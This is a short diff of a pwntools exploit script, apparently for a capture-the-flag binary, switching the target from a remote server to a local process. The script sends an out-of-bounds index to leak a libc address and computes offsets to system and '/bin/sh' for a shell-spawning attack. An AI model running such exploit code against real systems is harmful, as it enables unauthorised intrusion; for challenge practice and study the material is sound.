@@ -1,8 +1,8 @@
 from pwn import *
 #nc 132.226.171.228 14001
 time = 0.05
-#p = process("./new_sf2")
-p = remote("132.226.171.228", 14001);
+p = process("./new_sf2")
+# p = remote("132.226.171.228", 14001);
 p.sendline("1")
 sleep(time)
 p.sendline('-96')
@@ -11,6 +11,8 @@ p.recvuntil("Value : ")
 leak = u32(p.recv(4))
 
 print(hex(leak))
+
+input()
 
 sys_leak = leak - 0xe6e0
 bin_sh_leak = leak + 0x1100fb
